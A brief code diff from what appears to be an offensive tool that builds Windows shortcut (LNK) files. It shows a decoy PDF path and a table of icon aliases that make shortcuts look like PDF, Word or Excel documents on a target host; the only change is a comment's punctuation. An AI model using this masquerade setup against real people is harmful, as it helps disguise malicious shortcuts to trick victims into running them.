@@ -61,7 +61,7 @@ DECOY_FILE  = AGENT_CODE / "decoys" / "decoy.pdf"
 # LNK binary.  Resolution happens on the target host at shortcut launch time.
 # ---------------------------------------------------------------------------
 ICON_ALIASES: dict[str, tuple[str, int]] = {
-    # Microsoft Office — installer icon bundles
+    # Microsoft Office - installer icon bundles
     "pdf":         (r"%ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe",  13),
     "word":        (r"%PROGRAMFILES%\Microsoft Office\root\vfs\Windows\Installer\{90160000-000F-0000-1000-0000000FF1CE}\wordicon.exe",  0),
     "excel":       (r"%PROGRAMFILES%\Microsoft Office\root\vfs\Windows\Installer\{90160000-000F-0000-1000-0000000FF1CE}\xlicons.exe",   0),
